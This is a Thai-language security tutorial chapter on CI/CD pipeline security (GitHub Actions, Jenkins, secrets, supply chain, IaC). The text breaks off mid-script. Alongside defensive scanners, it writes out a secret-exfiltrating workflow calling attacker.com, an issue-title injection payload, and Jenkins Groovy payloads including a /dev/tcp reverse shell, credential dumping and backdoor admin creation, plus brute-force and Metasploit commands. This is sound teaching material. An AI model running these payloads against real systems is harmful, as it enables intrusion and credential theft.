# Part 45: CI/CD Pipeline Security (Steps 441-450)

## ภาพรวม
ส่วนนี้ครอบคลุมการทดสอบความปลอดภัยของ CI/CD Pipeline ตั้งแต่การโจมตี GitHub Actions, Jenkins, ไปจนถึงการป้องกัน supply chain attacks

---

## Step 441: GitHub Actions Security Testing

### แนวคิด
GitHub Actions workflows อาจมีช่องโหว่ที่นำไปสู่ secret exfiltration, code injection, หรือ privilege escalation

```python
import re
import json
import os
from pathlib import Path
from typing import Optional

class GitHubActionsAuditor:
    """
    ตรวจสอบความปลอดภัยของ GitHub Actions workflows
    """
    
    DANGEROUS_PATTERNS = [
        # Command injection via GitHub context
        (r'\$\{\{\s*github\.event\.(?:issue|pull_request|comment)\.(?:title|body)\s*\}\}',
         'CRITICAL', 'Untrusted input directly in run step - RCE risk'),
        
        # Secrets in env
        (r'env:\s*\n.*(?:PASSWORD|TOKEN|SECRET|KEY)\s*:\s*\$\{\{',
         'HIGH', 'Secrets exposed as environment variables'),
        
        # Pull request from fork with write permissions
        (r'pull_request_target.*write',
         'HIGH', 'pull_request_target with write permissions'),
        
        # Dangerous curl | bash
        (r'curl.*\|.*(?:bash|sh)',
         'HIGH', 'Downloading and executing script'),
        
        # Hardcoded credentials
        (r'(?i)(password|passwd|secret|token|key)\s*[:=]\s*[\'"][^\$]{4,}[\'"]',
         'HIGH', 'Hardcoded credentials in workflow'),
        
        # Self-hosted runners (persistence)
        (r'runs-on:\s*self-hosted',
         'MEDIUM', 'Self-hosted runner - check security'),
        
        # Unpinned actions
        (r'uses:\s*[\w-]+/[\w-]+@(?:main|master|latest|v\d+)',
         'MEDIUM', 'Unpinned action version'),
        
        # Inline script with sensitive data
        (r'echo.*\$\{\{\s*secrets\.',
         'HIGH', 'Printing secrets to output'),
    ]
    
    def scan_workflow_file(self, filepath: str) -> list:
        """สแกนไฟล์ workflow"""
        findings = []
        
        try:
            with open(filepath) as f:
                content = f.read()
                lines = content.split("\n")
            
            for pattern, severity, description in self.DANGEROUS_PATTERNS:
                matches = re.finditer(pattern, content, re.MULTILINE | re.IGNORECASE)
                for match in matches:
                    # Find line number
                    pos = match.start()
                    line_num = content[:pos].count("\n") + 1
                    
                    findings.append({
                        "file": filepath,
                        "line": line_num,
                        "severity": severity,
                        "description": description,
                        "snippet": content[max(0, pos-30):pos+100].strip()
                    })
        
        except Exception as e:
            findings.append({"file": filepath, "error": str(e)})
        
        return findings
    
    def scan_repository(self, repo_path: str) -> list:
        """สแกน repository ทั้งหมด"""
        all_findings = []
        
        workflow_dirs = [
            os.path.join(repo_path, ".github", "workflows"),
        ]
        
        for workflow_dir in workflow_dirs:
            if os.path.exists(workflow_dir):
                for file in Path(workflow_dir).glob("**/*.yml"):
                    findings = self.scan_workflow_file(str(file))
                    all_findings.extend(findings)
                for file in Path(workflow_dir).glob("**/*.yaml"):
                    findings = self.scan_workflow_file(str(file))
                    all_findings.extend(findings)
        
        return all_findings
    
    def check_permission_configuration(self, workflow_content: str) -> list:
        """ตรวจสอบ permissions ใน workflow"""
        issues = []
        
        # ตรวจสอบ write-all permissions
        if re.search(r'permissions:\s*write-all', workflow_content):
            issues.append("Workflow uses write-all permissions")
        
        # ตรวจสอบว่ามีการตั้งค่า permissions หรือไม่
        if not re.search(r'permissions:', workflow_content):
            issues.append("No explicit permissions defined - defaults apply")
        
        # ตรวจสอบ GITHUB_TOKEN ด้วย write permissions
        write_permissions = re.findall(
            r'(\w+):\s*write',
            workflow_content
        )
        if write_permissions:
            issues.append(f"Write permissions granted: {write_permissions}")
        
        return issues
    
    def test_secret_extraction(self) -> str:
        """แสดงวิธีดึง secrets จาก workflow"""
        # ตัวอย่างการดึง secrets ผ่าน environment variable
        exploit_workflow = """
# Malicious workflow to exfiltrate secrets
name: Exploit
on: [push]

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
    - name: Exfil secrets
      env:
        TOKEN: ${{ secrets.GITHUB_TOKEN }}
        CUSTOM: ${{ secrets.MY_SECRET }}
      run: |
        # Method 1: Log to console (visible in logs)
        echo "Token: $TOKEN"
        
        # Method 2: Exfil via HTTP
        curl -d "secrets=$TOKEN" https://attacker.com/collect
        
        # Method 3: Via artifact
        echo $TOKEN > /tmp/stolen_creds
        
    - name: Upload artifact
      uses: actions/upload-artifact@v3
      with:
        name: output
        path: /tmp/stolen_creds
"""
        return exploit_workflow
    
    def generate_secure_workflow(self) -> str:
        """สร้าง secure workflow template"""
        return """
name: Secure Workflow
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    
# ตั้งค่า permissions แบบ minimal
permissions:
  contents: read
  
jobs:
  build:
    runs-on: ubuntu-latest
    
    # Pin เวอร์ชัน actions ด้วย SHA hash
    steps:
    - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
    
    - name: Run tests
      run: |
        # ไม่ print secrets
        # ไม่ใช้ untrusted input โดยตรง
        npm test
    
    - name: Security scan
      uses: aquasecurity/trivy-action@b2933aee04af773b6a4c27fc9df7f77012d5b72  # main
      with:
        scan-type: 'fs'
        scan-ref: '.'
"""


# GitHub Actions attack scenarios
GHA_ATTACKS = """
# GitHub Actions Attack Scenarios

# 1. Script Injection via Issue Title
# Vulnerable workflow:
# - run: echo "Issue title: ${{ github.event.issue.title }}"
# Attack: Issue title = `"; curl https://attacker.com/$(cat /etc/passwd); #`

# 2. pull_request_target Attack
# Allows fork PRs to access secrets
# Attacker creates fork, submits PR with malicious workflow

# 3. Self-hosted runner compromise
# Run malicious code that persists between jobs

# 4. Dependency confusion
# Publish malicious package to public registry with same name as internal

# 5. Token theft
# Extract GITHUB_TOKEN from env and use to create backdoor

# Useful tools:
# - truffleHog: scan for secrets in git history
trufflehog git https://github.com/ORG/REPO

# - gitleaks: scan for secrets
gitleaks detect --source .
gitleaks protect --staged  # pre-commit hook

# - semgrep: SAST for workflows
semgrep --config p/github-actions .

# - actionlint: lint GitHub Actions workflows
actionlint .github/workflows/*.yml

# - step-security/harden-runner: runtime security for GHA
# Add to workflow:
# - uses: step-security/harden-runner@v2
#   with:
#     egress-policy: audit
"""

if __name__ == "__main__":
    auditor = GitHubActionsAuditor()
    print(auditor.generate_secure_workflow())
    print(GHA_ATTACKS)
```

---

## Step 442: Jenkins Security Assessment

### แนวคิด
Jenkins เป็น CI/CD ที่นิยมใช้มาก การตั้งค่าที่ผิดพลาดหรือการใช้ Groovy script อาจนำไปสู่ RCE

```python
import requests
import json
import urllib3
from typing import Optional

urllib3.disable_warnings()

class JenkinsAssessor:
    """
    ตรวจสอบความปลอดภัยของ Jenkins
    """
    
    def __init__(self, url: str, username: str = None, password: str = None):
        self.url = url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        
        if username and password:
            self.session.auth = (username, password)
    
    def check_anonymous_access(self) -> dict:
        """ตรวจสอบ anonymous access"""
        endpoints = [
            f"{self.url}/api/json",
            f"{self.url}/script",
            f"{self.url}/manage",
            f"{self.url}/credentials/",
            f"{self.url}/user/admin/configure",
            f"{self.url}/asynchPeople/",
        ]
        
        results = {}
        for endpoint in endpoints:
            try:
                resp = self.session.get(endpoint, timeout=10)
                results[endpoint] = {
                    "status": resp.status_code,
                    "accessible": resp.status_code == 200
                }
            except Exception as e:
                results[endpoint] = {"error": str(e)}
        
        return results
    
    def get_build_info(self) -> list:
        """ดึงข้อมูลเกี่ยวกับ jobs"""
        try:
            resp = self.session.get(
                f"{self.url}/api/json?tree=jobs[name,url,color]",
                timeout=10
            )
            if resp.status_code == 200:
                data = resp.json()
                return data.get("jobs", [])
        except Exception:
            pass
        return []
    
    def execute_groovy_script(self, script: str) -> dict:
        """รัน Groovy script ผ่าน Script Console"""
        # Jenkins Script Console URL
        script_url = f"{self.url}/script"
        
        # Get crumb token (CSRF protection)
        crumb = self._get_crumb()
        
        data = {"script": script}
        headers = {}
        if crumb:
            headers[crumb["crumbRequestField"]] = crumb["crumb"]
        
        try:
            resp = self.session.post(
                script_url,
                data=data,
                headers=headers,
                timeout=30
            )
            return {
                "status": resp.status_code,
                "output": resp.text[:2000]
            }
        except Exception as e:
            return {"error": str(e)}
    
    def _get_crumb(self) -> Optional[dict]:
        """ดึง CSRF crumb"""
        try:
            resp = self.session.get(
                f"{self.url}/crumbIssuer/api/json"
            )
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass
        return None
    
    def get_credentials(self) -> list:
        """ดึง stored credentials ผ่าน API"""
        try:
            resp = self.session.get(
                f"{self.url}/credentials/store/system/domain/_/api/json"
                "?tree=credentials[id,displayName,typeName]"
            )
            if resp.status_code == 200:
                data = resp.json()
                return data.get("credentials", [])
        except Exception:
            pass
        return []
    
    def rce_via_script_console(self, command: str) -> str:
        """รัน OS command ผ่าน Groovy script console"""
        groovy_script = f"""
def cmd = ["/bin/bash", "-c", """{command}"""]
def proc = cmd.execute()
proc.waitFor()
def out = proc.in.text
def err = proc.err.text
return "OUT: ${out}\\nERR: ${err}"
"""
        result = self.execute_groovy_script(groovy_script)
        return result.get("output", "")
    
    def check_cve_vulnerabilities(self) -> list:
        """ตรวจสอบ CVE ต่างๆ"""
        vulns = []
        
        # Get Jenkins version
        try:
            resp = self.session.get(f"{self.url}/")
            version = resp.headers.get("X-Jenkins", "unknown")
            
            KNOWN_VULNS = {
                "2.0": ["CVE-2017-1000353 - Java deserialization (RCE)"],
                "2.138": ["CVE-2018-1000861 - Dynamic Routing RCE"],
                "2.264": ["CVE-2021-21608 - Stored XSS"],
                "2.319": ["CVE-2021-21697 - Agent access restriction bypass"],
            }
            
            vulns.append({
                "jenkins_version": version,
                "check_manually": "Compare against https://jenkins.io/security/advisories/"
            })
        except Exception:
            pass
        
        return vulns
    
    def dump_config(self, job_name: str) -> str:
        """ดึง Jenkins job config"""
        try:
            resp = self.session.get(
                f"{self.url}/job/{job_name}/config.xml"
            )
            if resp.status_code == 200:
                return resp.text
        except Exception:
            pass
        return ""


# Groovy RCE payloads for Jenkins
GROOVY_PAYLOADS = """
# Groovy Script Console Payloads

# 1. Execute OS command
def cmd = "id".execute()
println cmd.text

# 2. Reverse shell
Thread.start {
  def proc = ["/bin/bash", "-c",
    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()
  proc.waitFor()
}

# 3. Read credentials store
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import org.jenkinsci.plugins.plaincredentials.*
import java.io.*

def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardCredentials.class,
  Jenkins.instance,
  null,
  null
)

creds.each { cred ->
  if (cred instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
    println "[USER/PASS] ${cred.id} - ${cred.username}:${cred.password}"
  } else if (cred instanceof org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl) {
    println "[SECRET TEXT] ${cred.id}: ${cred.secret}"
  }
}

# 4. ดึง Jenkins secrets decrypted
import jenkins.model.Jenkins
import hudson.util.Secret

def secret = Secret.fromString("ENCRYPTED_SECRET")
println secret.plainText

# 5. Create admin user
import hudson.security.*
def hudsonRealm = new HudsonPrivateSecurityRealm(false)
hudsonRealm.createAccount("hacker", "password123")
Jenkins.instance.setSecurityRealm(hudsonRealm)
Jenkins.instance.save()
"""

JENKINS_AUDIT = """
# Jenkins Security Audit Commands

# 1. ค้นหา Jenkins instances
nmap -sV -p 8080,8443,9090 TARGET_RANGE
shodan search 'X-Jenkins: 2'

# 2. ตรวจสอบ anonymous access
curl http://TARGET:8080/api/json
curl http://TARGET:8080/script

# 3. Brute force
hydra -l admin -P rockyou.txt TARGET http-form-post \
  '/j_spring_security_check:j_username=^USER^&j_password=^PASS^:Invalid'

# 4. ใช้ Metasploit
msfconsole -q -x 'use auxiliary/scanner/http/jenkins_login; \
  set RHOSTS TARGET; set RPORT 8080; run'

# CVE-2018-1000861 - Jenkins RCE
msfconsole -q -x 'use exploit/multi/http/jenkins_script_console; \
  set RHOSTS TARGET; set RPORT 8080; run'

# 5. สแกน Jenkins ด้วย jenkins-audit-tool
pip install jenkinsapi
"""

if __name__ == "__main__":
    assessor = JenkinsAssessor("http://localhost:8080")
    print("Groovy payloads loaded")
    print(GROOVY_PAYLOADS)
```

---

## Step 443: Pipeline Secrets Management Testing

### แนวคิด
การจัดการ secrets ใน CI/CD pipelines ที่ไม่ดีอาจทำให้ credentials รั่วไหลออกไปใน logs, artifacts, หรือ environment variables

```python
import re
import os
import json
from pathlib import Path
from typing import Optional

class SecretsLeakDetector:
    """
    ตรวจสอปการรั่วไหลของ secrets ใน CI/CD
    """
    
    # Secret patterns
    SECRET_PATTERNS = [
        ("AWS Access Key", r'AKIA[0-9A-Z]{16}'),
        ("AWS Secret Key", r'(?i)aws_secret_access_key[\s]*=[\s]*[A-Za-z0-9/+=]{40}'),
        ("GitHub Token", r'gh[pousr]_[0-9a-zA-Z]{36}'),
        ("GitHub Personal Token", r'ghp_[0-9a-zA-Z]{36}'),
        ("Stripe Key", r'sk_live_[0-9a-zA-Z]{24}'),
        ("RSA Private Key", r'-----BEGIN RSA PRIVATE KEY-----'),
        ("EC Private Key", r'-----BEGIN EC PRIVATE KEY-----'),
        ("Generic API Key", r'(?i)api[_-]?key[\s]*[=:][\s]*[\w-]{20,}'),
        ("Generic Password", r'(?i)password[\s]*[=:][\s]*[\S]{8,}'),
        ("JWT Token", r'eyJ[0-9a-zA-Z_-]*\.[0-9a-zA-Z_-]*\.[0-9a-zA-Z_-]*'),
        ("Slack Token", r'xox[baprs]-[0-9a-zA-Z-]{10,}'),
        ("Database URL", r'(?i)(mysql|postgres|mongodb)://[\w:@./-]+'),
        ("Docker Hub Token", r'dckr_pat_[A-Za-z0-9_-]{28}'),
        ("NPM Token", r'npm_[A-Za-z0-9]{36}'),
        ("Generic Secret", r'(?i)secret[\s]*[=:][\s]*[\S]{8,}'),
    ]
    
    def scan_file(self, filepath: str) -> list:
        """สแกนไฟล์หา secrets"""
        findings = []
        
        try:
            with open(filepath, 'r', errors='replace') as f:
                content = f.read()
                lines = content.split('\n')
            
            for i, line in enumerate(lines, 1):
                for secret_type, pattern in self.SECRET_PATTERNS:
                    if re.search(pattern, line):
                        # Mask the secret
                        masked_line = re.sub(
                            pattern,
                            lambda m: m.group(0)[:6] + "***REDACTED***",
                            line
                        )
                        findings.append({
                            "file": filepath,
                            "line": i,
                            "type": secret_type,
                            "context": masked_line.strip()[:100]
                        })
        except Exception as e:
            pass
        
        return findings
    
    def scan_git_history(self, repo_path: str) -> str:
        """สแกน git history หา secrets ที่ถูกลบไปแล้ว"""
        import subprocess
        
        cmd = [
            "git", "-C", repo_path,
            "log", "--all", "--full-history",
            "--oneline", "-p", "--",
            "*.env", "*.yaml", "*.yml", "*.json", "*.conf"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            # สแกน output
            for secret_type, pattern in self.SECRET_PATTERNS:
                matches = re.findall(pattern, result.stdout)
                if matches:
                    return f"Found {secret_type} in git history!"
        
        return "No obvious secrets in git history"
    
    def scan_build_logs(self, log_content: str) -> list:
        """สแกน build logs"""
        findings = []
        
        for secret_type, pattern in self.SECRET_PATTERNS:
            matches = re.finditer(pattern, log_content, re.MULTILINE)
            for match in matches:
                # Find surrounding context
                start = max(0, match.start() - 50)
                end = min(len(log_content), match.end() + 50)
                context = log_content[start:end]
                
                findings.append({
                    "type": secret_type,
                    "context": context,
                    "match": match.group(0)[:20] + "***"
                })
        
        return findings
    
    def check_common_leak_points(self, repo_path: str) -> list:
        """ตรวจสอบจุดที่มักรั่วไหล secrets"""
        leak_points = []
        
        # Files ที่มักมี secrets
        suspicious_files = [
            ".env", ".env.local", ".env.production",
            "config.yaml", "config.yml", "config.json",
            "secrets.yaml", "credentials.json",
            "id_rsa", "id_ed25519",
            ".aws/credentials", ".npmrc", ".pypirc",
            "docker-compose.yml", "docker-compose.yaml",
            "terraform.tfvars", "terraform.tfstate",
        ]
        
        for filename in suspicious_files:
            full_path = os.path.join(repo_path, filename)
            if os.path.exists(full_path):
                leak_points.append({
                    "file": full_path,
                    "concern": "Sensitive file found in repository",
                    "action": "Verify it doesn't contain real credentials"
                })
        
        # ตรวจสอบ .gitignore
        gitignore_path = os.path.join(repo_path, ".gitignore")
        if os.path.exists(gitignore_path):
            with open(gitignore_path) as f:
                gitignore_content = f.read()
            
            for filename in [".env", "*.pem", "*.key", "credentials"]:
                if filename not in gitignore_content:
                    leak_points.append({
                        "issue": f"{filename} not in .gitignore",
                        "action": f"Add {filename} to .gitignore"
                    })
        
        return leak_points
    
    def generate_report(self, repo_path: str) -> str:
        """สร้างรายงาน"""
        report = ["=" * 60]
        report.append("CI/CD SECRETS LEAK DETECTION REPORT")
        report.append("=" * 60)
        
        # Scan all files
        all_findings = []
        for ext in [".yml", ".yaml", ".json", ".env", ".sh", ".conf"]:
            for filepath in Path(repo_path).rglob(f"*{ext}"):
                findings = self.scan_file(str(filepath))
                all_findings.extend(findings)
        
        report.append(f"\nSecrets found: {len(all_findings)}")
        for f in all_findings[:20]:
            report.append(f"  [{f['type']}] {f['file']}:{f['line']}")
            report.append(f"    Context: {f['context']}")
        
        # Common leak points
        leaks = self.check_common_leak_points(repo_path)
        report.append(f"\nPotential leak points: {len(leaks)}")
        for leak in leaks:
            report.append(f"  - {leak}")
        
        return "\n".join(report)


SECRETS_TOOLS = """
# Secrets Detection Tools

# 1. TruffleHog - สแกน git history
trufflehog git https://github.com/ORG/REPO
trufflehog git file://./  # local repo
trufflehog github --org=ORG  # scan entire org

# 2. Gitleaks - scan repository
gitleaks detect --source . --verbose
gitleaks detect --source . -f json -r results.json

# 3. GitGuardian
gg shield scan commit-range HEAD~5..HEAD
pip install ggshield

# 4. detect-secrets by Yelp
pip install detect-secrets
detect-secrets scan . > .secrets.baseline
detect-secrets audit .secrets.baseline

# 5. สแกน S3 buckets ใน CircleCI artifacts
curl https://circleci.com/api/v2/project/github/ORG/REPO/pipeline \
  -H "Circle-Token: TOKEN"

# 6. หา exposed env vars ใน Travis CI
curl https://api.travis-ci.com/v3/repo/ORG%2FREPO/env_vars \
  -H 'Travis-API-Version: 3' \
  -H 'Authorization: token TOKEN'
"""

print(SECRETS_TOOLS)
```

---

## Step 444: Supply Chain Attack Prevention

### แนวคิด
Supply chain attacks โจมตีผ่าน dependencies การเข้าใจเอเจนต์ packages ที่ใช้ทั่วไปสามารถแพร่กระจาย malware ได้

```python
import subprocess
import json
import hashlib
import requests
from typing import Optional

class SupplyChainAuditor:
    """
    ตรวจสอบความปลอดภัยของ software supply chain
    """
    
    def check_npm_dependencies(self, package_json_path: str) -> list:
        """ตรวจสอบ npm dependencies"""
        vulnerabilities = []
        
        try:
            with open(package_json_path) as f:
                pkg = json.load(f)
            
            # Get all deps
            all_deps = {}
            all_deps.update(pkg.get("dependencies", {}))
            all_deps.update(pkg.get("devDependencies", {}))
            
            # Check for typosquatting
            POPULAR_PACKAGES = [
                "lodash", "express", "react", "angular", "vue",
                "axios", "moment", "jquery", "bootstrap", "webpack"
            ]
            
            TYPOSQUATTING_PATTERNS = {
                "lodash": ["1odash", "Iodash", "lodas", "iodash"],
                "express": ["expres", "exprss", "expr3ss"],
                "react": ["re4ct", "recat", "rreact"],
            }
            
            for dep_name in all_deps.keys():
                for popular, typos in TYPOSQUATTING_PATTERNS.items():
                    if dep_name in typos:
                        vulnerabilities.append({
                            "package": dep_name,
                            "type": "Potential typosquatting",
                            "similar_to": popular,
                            "severity": "HIGH"
                        })
            
            # Check for overly broad version specs
            for dep, version in all_deps.items():
                if version.startswith("*") or version == "latest":
                    vulnerabilities.append({
                        "package": dep,
                        "version": version,
                        "type": "Unpinned dependency version",
                        "severity": "MEDIUM"
                    })
        
        except Exception as e:
            vulnerabilities.append({"error": str(e)})
        
        return vulnerabilities
    
    def run_npm_audit(self, project_path: str) -> dict:
        """รัน npm audit"""
        result = subprocess.run(
            ["npm", "audit", "--json"],
            capture_output=True, text=True,
            cwd=project_path
        )
        
        if result.returncode != 0 or result.stdout:
            try:
                data = json.loads(result.stdout)
                return {
                    "vulnerabilities": data.get("metadata", {}).get("vulnerabilities", {}),
                    "critical": data.get("metadata", {}).get("vulnerabilities", {}).get("critical", 0),
                    "high": data.get("metadata", {}).get("vulnerabilities", {}).get("high", 0),
                }
            except Exception:
                pass
        
        return {"error": "npm audit failed"}
    
    def check_python_dependencies(self, requirements_path: str) -> list:
        """ตรวจสอบ Python dependencies"""
        vulnerabilities = []
        
        # Run safety check
        result = subprocess.run(
            ["safety", "check", "-r", requirements_path, "--json"],
            capture_output=True, text=True
        )
        
        if result.returncode != 0:
            try:
                data = json.loads(result.stdout)
                for vuln in data:
                    vulnerabilities.append({
                        "package": vuln[0],
                        "installed_version": vuln[2],
                        "affected_versions": vuln[1],
                        "vulnerability": vuln[3],
                        "cve": vuln[4]
                    })
            except Exception:
                pass
        
        return vulnerabilities
    
    def verify_package_integrity(self, package_name: str, version: str, 
                                   expected_hash: str, registry: str = "https://registry.npmjs.org") -> bool:
        """ตรวจสอบ hash ของ package"""
        try:
            resp = requests.get(
                f"{registry}/{package_name}/{version}",
                timeout=10
            )
            if resp.status_code == 200:
                data = resp.json()
                dist = data.get("dist", {})
                actual_hash = dist.get("integrity", "")
                
                return actual_hash == expected_hash
        except Exception:
            pass
        return False
    
    def simulate_dependency_confusion(self, internal_packages: list) -> list:
        """จำลองการตรวจสอบ dependency confusion"""
        at_risk = []
        
        for pkg_name in internal_packages:
            # Check if package exists on public registry
            try:
                resp = requests.get(
                    f"https://registry.npmjs.org/{pkg_name}",
                    timeout=5
                )
                if resp.status_code == 200:
                    data = resp.json()
                    latest_version = data.get("dist-tags", {}).get("latest", "unknown")
                    at_risk.append({
                        "package": pkg_name,
                        "exists_publicly": True,
                        "public_version": latest_version,
                        "risk": "Package exists in public registry - verify it's not malicious"
                    })
                else:
                    at_risk.append({
                        "package": pkg_name,
                        "exists_publicly": False,
                        "risk": "Package doesn't exist publicly - could be registered by attacker"
                    })
            except Exception:
                pass
        
        return at_risk
    
    def generate_sbom(self, project_path: str) -> str:
        """สร้าง Software Bill of Materials"""
        result = subprocess.run(
            ["syft", "dir:"+project_path, "-o", "json"],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            return result.stdout
        
        # Fallback: simple SBOM
        sbom = {
            "format": "basic-sbom",
            "project": project_path,
            "dependencies": []
        }
        
        # Check for package files
        for pkg_file in ["package-lock.json", "requirements.txt", "go.sum"]:
            full_path = os.path.join(project_path, pkg_file)
            if os.path.exists(full_path):
                sbom["dependencies"].append({
                    "manager": pkg_file,
                    "path": full_path
                })
        
        return json.dumps(sbom, indent=2)


SUPPLY_CHAIN_BEST_PRACTICES = """
# Supply Chain Security Best Practices

# 1. ตรวจสอบ vulnerabilities
npm audit --audit-level=moderate
pip install safety && safety check
bundler audit

# 2. Pin dependencies
# package.json
"dependencies": {
  "lodash": "4.17.21"  # pin exact version, not ^4.17.21
}

# requirements.txt
lodash==4.17.21

# 3. ใช้ lockfiles
# npm: package-lock.json
# yarn: yarn.lock
# Python: pip-lock, pipenv/Pipfile.lock
# Go: go.sum

# 4. ตรวจสอบ integrity hashes
npm install --prefer-offline
npm ci  # strict install from lockfile

# 5. ใช้ private registry
# .npmrc:
registry=https://your-private-registry.example.com/

# 6. SBOM generation
syft . -o spdx-json > sbom.json
grype sbom:./sbom.json

# 7. Sigstore/cosign สำหรับ verification
cosign verify-blob --certificate cert.pem \
  --signature sig.sig package.tar.gz

# 8. Renovate Bot - automated dependency updates
# .github/renovate.json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:base"],
  "prHourlyLimit": 5,
  "automerge": false
}
"""

print(SUPPLY_CHAIN_BEST_PRACTICES)
```

---

## Step 445: Infrastructure as Code Security

### แนวคิด
Infrastructure as Code (IaC) ไฟล์ Terraform, CloudFormation อาจมีการตั้งค่าที่ไม่ปลอดภัยหรือ secrets ที่ฝังอยู่ใน code

```python
import re
import json
import os
from pathlib import Path
from typing import Optional

class IaCSecurityScanner:
    """
    สแกนความปลอดภัยใน Infrastructure as Code
    """
    
    TERRAFORM_ISSUES = [
        (r'password\s*=\s*"[^$][^{][^"]{3,}"', 'HIGH', 'Hardcoded password in Terraform'),
        (r'secret_key\s*=\s*"[^$][^{][^"]{3,}"', 'HIGH', 'Hardcoded secret in Terraform'),
        (r'access_key\s*=\s*"AKIA[0-9A-Z]{16}"', 'CRITICAL', 'Hardcoded AWS access key'),
        (r'encryption\s*=\s*false', 'HIGH', 'Storage encryption disabled'),
        (r'publicly_accessible\s*=\s*true', 'HIGH', 'Database publicly accessible'),
        (r'ingress.*cidr_blocks.*0\.0\.0\.0/0', 'MEDIUM', 'Security group allows all inbound'),
        (r'"0\.0\.0\.0/0"', 'MEDIUM', 'Open CIDR range'),
        (r'skip_final_snapshot\s*=\s*true', 'MEDIUM', 'RDS final snapshot disabled'),
        (r'multi_az\s*=\s*false', 'LOW', 'RDS Multi-AZ disabled'),
        (r'deletion_protection\s*=\s*false', 'LOW', 'Deletion protection disabled'),
    ]
    
    CLOUDFORMATION_ISSUES = [
        (r'NoEcho.*false', 'HIGH', 'Parameter NoEcho disabled'),
        (r'Principal.*\*', 'HIGH', 'IAM policy allows all principals'),
        (r'Action.*\*.*Resource.*\*', 'CRITICAL', 'Wildcard IAM policy'),
        (r'Effect.*Allow.*Action.*s3.*Resource.*\*', 'HIGH', 'S3 wildcard permission'),
        (r'"IpProtocol":\s*"-1"', 'MEDIUM', 'Security group allows all protocols'),
    ]
    
    def scan_terraform(self, tf_path: str) -> list:
        """สแกน Terraform files"""
        findings = []
        
        for filepath in Path(tf_path).rglob("*.tf"):
            try:
                with open(filepath) as f:
                    content = f.read()
                    lines = content.split("\n")
                
                for pattern, severity, description in self.TERRAFORM_ISSUES:
                    for i, line in enumerate(lines, 1):
                        if re.search(pattern, line, re.IGNORECASE):
                            findings.append({
                                "file": str(filepath),
                                "line": i,
                                "severity": severity,
                                "description": description,
                                "context": line.strip()
                            })
            except Exception:
                pass
        
        return findings
    
    def scan_cloudformation(self, cf_path: str) -> list:
        """สแกน CloudFormation templates"""
        findings = []
        
        for ext in ["*.yaml", "*.yml", "*.json", "*.template"]:
            for filepath in Path(cf_path).rglob(ext):
                try:
                    with open(filepath) as f:
                        content = f.read()
                    
                    # ตรวจสอบว่าเป็น CloudFormation template
                    if "AWSTemplateFormatVersion" not in content and "Resources" not in content:
                        continue
                    
                    for pattern, severity, description in self.CLOUDFORMATION_ISSUES:
                        matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                        if matches:
                            findings.append({
                                "file": str(filepath),
                                "severity": severity,
                                "description": description
                            })
                except Exception:
                    pass
        
        return findings
    
    def check_state_file_exposure(self, tf_path: str) -> list:
        """ตรวจสอบ Terraform state file exposure"""
        issues = []
        
        # หา state files
        for filepath in Path(tf_path).rglob("*.tfstate"):
            issues.append({
                "file": str(filepath),
                "issue": "Terraform state file found - may contain secrets",
                "severity": "HIGH"
            })
        
        # ตรวจสอบว่ามี state file ใน .gitignore
        gitignore = os.path.join(tf_path, ".gitignore")
        if os.path.exists(gitignore):
            with open(gitignore) as f:
                if "*.tfstate" not in f.read():
                    issues.append({
                        "issue": "*.tfstate not in .gitignore",
                        "severity": "HIGH",
                        "recommendation": "Add *.tfstate and *.tfstate.backup to .gitignore"
                    })
        
        return issues
    
    def run_checkov(self, path: str, framework: str = "all") -> dict:
        """รัน Checkov IaC scanner"""
        import subprocess
        
        cmd = ["checkov", "-d", path, "-o", "json"]
        if framework != "all":
            cmd.extend(["--framework", framework])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.stdout:
            try:
                data = json.loads(result.stdout)
                summary = data.get("summary", {})
                return {
                    "passed": summary.get("passed", 0),
                    "failed": summary.get("failed", 0),
                    "failed_checks": [
                        {
                            "check_id": check.get("check_id"),
                            "check_type": check.get("check_type"),
                            "resource": check.get("resource"),
                            "file": check.get("file_path")
                        }
                        for check in data.get("results", {}).get("failed_checks", [])[:20]
                    ]
                }
            except Exception:
                pass
        
        return {"error": "checkov scan failed"}


IAC_SECURITY_TOOLS = """
# IaC Security Tools

# 1. Checkov - Multi-framework IaC scanner
pip install checkov
checkov -d . --framework terraform
checkov -d . --framework cloudformation
checkov -d . --framework kubernetes
checkov -f main.tf

# 2. tfsec - Terraform security scanner
brew install tfsec
tfsec .
tfsec . --format json

# 3. Terrascan
pip install terrascan
terrascan scan -i terraform -d .

# 4. cfn-nag - CloudFormation scanner
gem install cfn-nag
cfn_nag_scan --input-path .

# 5. KICS (Keeping Infrastructure as Code Secure)
docker run -v $(pwd):/path checkmarx/kics scan -p /path

# 6. ตรวจสอบ Terraform state สำหรับ secrets
terraform show -json | \
  python3 -c "import sys,json; \
    data=json.load(sys.stdin); \
    [print(r) for r in str(data) if 'password' in str(r).lower()]"

# 7. หา hardcoded secrets
gitguardian scan --all-policies .
"""

print(IAC_SECURITY_TOOLS)
```

---

## Step 446: Container Build Pipeline Security

### แนวคิด
การสร้าง container images ใน pipeline ต้องมีการตรวจสอบความปลอดภัยทุกขั้นตอน

```bash
#!/bin/bash
# Secure Container Build Pipeline

# Stage 1: Source code security scan
echo "[*] Running SAST scan..."
semgrep --config auto src/ --json > sast_results.json
gitleaks detect --source . -f json -r secrets_scan.json

# Stage 2: Dockerfile security scan
echo "[*] Scanning Dockerfile..."
checkov -f Dockerfile
hadolint Dockerfile  # Dockerfile linter

# Stage 3: Build image
echo "[*] Building Docker image..."
docker build \
  --no-cache \
